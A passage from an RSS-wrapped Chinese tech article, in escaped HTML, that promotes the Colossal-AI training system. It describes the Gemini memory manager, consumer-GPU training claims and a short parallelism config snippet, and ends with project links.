md-inline=&quot;plain&quot;&gt;最快可实现 40% 的加速&lt;/span&gt;&lt;/strong&gt;。而 PyTorch 等传统深度学习框架，在单张 GPU 上已经无法运行如此大的模型。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;151&quot; data-ratio=&quot;0.2721474131821403&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObZ4atwHicrrL7NUic6hiascbg0VTQ9CwEf4s268ffYzOhicQhuNzp44LYwg/640?wx_fmt=png&quot; data-w=&quot;4233&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;对于使用 8 张 GPU 的并行训练，Colossal-AI 仅需在启动命令中添加 - nprocs 8 即可实现！&lt;/span&gt;&lt;/section&gt;&lt;h3 cid=&quot;n180&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;背后秘诀&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;如此显著的提升来自于 Colossal-AI 的高效异构内存管理子系统 Gemini。简单的来说，在模型训练时，Gemini 在前面的几个 step 进行预热，收集 PyTorch 动态计算图中的内存消耗信息；在预热结束后，计算一个算子前，利用收集的内存使用记录，Gemini 将预留出这个算子在计算设备上所需的峰值内存，并同时从 GPU 显存里移动一些模型张量到 CPU 内存。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;217&quot; data-ratio=&quot;0.3875&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4Ob6u3ZtN2DyTTR5Hs4VQQXedz98VdyVrI0HEicazlia6MYRiaHNaWNJYAxw/640?wx_fmt=png&quot; data-w=&quot;1280&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Gemini 内置的内存管理器给每个张量都标记一个状态信息，包括 HOLD、COMPUTE、FREE 等。然后，根据动态查询到的内存使用情况，不断动态转换张量状态、调整张量位置，相比起 DeepSpeed 的 ZeRO Offload 的静态划分，Colossal-AI Gemini 能更高效利用 GPU 显存和 CPU 内存，实现在硬件极其有限的情况下，最大化模型容量和平衡训练速度。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;316&quot; data-ratio=&quot;0.5627177700348432&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObxCrEb2xCwN3BoreH5eI0CXOzoWaDq6hbOnHV5cQ8HEWLz8lGIrq7Ag/640?wx_fmt=png&quot; data-w=&quot;1148&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;对于大模型的代表 GPT，使用 Colossal-AI 在搭载 RTX 2060 6GB 的普通游戏笔记本上，也足以训练高达 15 亿参数模型；对于搭载 RTX3090 24GB 的个人电脑，更是可以直接训练 180 亿参数的模型；对于 Tesla V100 等专业计算卡，Colossal-AI 也能显示出显著改善。&lt;/span&gt;&lt;/section&gt;&lt;h3 cid=&quot;n186&quot; mdtype=&quot;heading&quot;&gt;&lt;span md-inline=&quot;plain&quot;&gt;便捷高效并行扩展&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;想要以最短时间训练当今世界最大最前沿的 AI 模型，仍离不开高效的分布式并行扩展。对于同时使用数据并行、流水并行、2.5 维张量并行等&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;复杂并行策略，仅需简单声明，即可自动实现&lt;/span&gt;&lt;/strong&gt;，Colossal-AI 无需像其他系统和框架侵入代码，手动处理复杂的底层逻辑。&lt;/span&gt;&lt;/section&gt;&lt;pre spellcheck=&quot;false&quot; lang=&quot;python&quot; cid=&quot;n188&quot; mdtype=&quot;fences&quot;&gt;&lt;span role=&quot;presentation&quot;&gt;&lt;span&gt;parallel&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;dict&lt;/span&gt;(&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;   &lt;span&gt;pipeline&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;   &lt;span&gt;tensor&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;dict&lt;/span&gt;(&lt;span&gt;mode&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&#x27;2.5d&#x27;&lt;/span&gt;, &lt;span&gt;depth&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;, &lt;span&gt;size&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span role=&quot;presentation&quot;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;在面对扩展至数十甚至数百张 GPU 的大规模并行场景时，相比英伟达 Megatron-LM 等现有系统，Colossal-AI 在性能上仍显示出显著的加速性能和资源节约。这意味着对于&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;预训练 GPT-3 等超大 AI 模型，可节省数百万元的训练费用。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;image&quot; data-src=&quot;https://mmbiz.qlogo.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4Obf2z0r6kO2awIZwFk1MegpOsOh4Yop5bfanVSWQichkO7wcAoXEHnBvw/0?wx_fmt=png&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-cropselx1=&quot;0&quot; data-cropselx2=&quot;561&quot; data-cropsely1=&quot;0&quot; data-cropsely2=&quot;154&quot; data-ratio=&quot;0.2767195767195767&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/uDRkMWLia28iaPjFBfpNAy7GzuVjrze4ObJUDZNWWhaYsIKPAu0Zlb04XGmiat7fuIuQQsZwkfP2C4zMfcLkY9zFQ/640?wx_fmt=png&quot; data-w=&quot;1890&quot;/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Colossal-AI 相关解决方案已成功在&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;自动驾驶、云计算、零售、医药、芯片&lt;/span&gt;&lt;/strong&gt;等行业知名厂商落地应用，广受好评。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;Colossal-AI 注重开源社区建设，提供中文教程，开放用户社群及论坛，对于用户反馈进行高效交流与迭代更新，不断添加 PaLM、AlphaFold 等前沿应用。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;自然开源以来，Colossal-AI 已经&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;多次在 GitHub 及 Papers With Code 热榜位列世界第一&lt;/span&gt;&lt;/strong&gt;，与众多已有数万 star 的明星开源项目一起受到海内外关注！&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;strong&quot;&gt;&lt;strong&gt;&lt;span md-inline=&quot;plain&quot;&gt;传送门&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span md-inline=&quot;plain&quot;&gt;GitHub：&lt;/span&gt;&lt;span&gt;&lt;em&gt;&lt;span&gt;https://github.com/hpcaitech/ColossalAI&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;em&gt;&lt;span&gt;参考文献：&lt;/span&gt;&lt;/em&gt;&lt;/section&gt;&lt;ul class=&quot;list-paddingleft-1&quot; cid=&quot;n200&quot; mdtype=&quot;list&quot; data-mark=&quot;-&quot;&gt;&lt;li&gt;&lt;p cid=&quot;n367&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://arxiv.org/abs/2202.05924v2&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n368&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://arxiv.org/abs/2205.11487&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n371&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://github.com/features/copilot&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p cid=&quot;n374&quot; mdtype=&quot;paragraph&quot;&gt;&lt;em&gt;&lt;span&gt;https://github.com/huggingface/transformers&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzIwODkxOTA1Nw==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/TpAfliaLqyRJDMaA2zxO28ARbQj8zbupLjyvaSQ01uHu3ficgQvwNxhJUfDTzp4kDCc8d4jH8Kia6BickXz2LZM4NQ/0?wx_fmt=png&quot; data-nickname=&quot;GitCube&quot; data-alias=&quot;GitCube&quot; data-signature=&quot;专注于分享 Python、Java、AI、Web 等多个计算机科学领域的优质学习资源及开发者工具。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;
          &lt;/div&gt;

          

          



           
                                
                    
        &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
</channel></rss>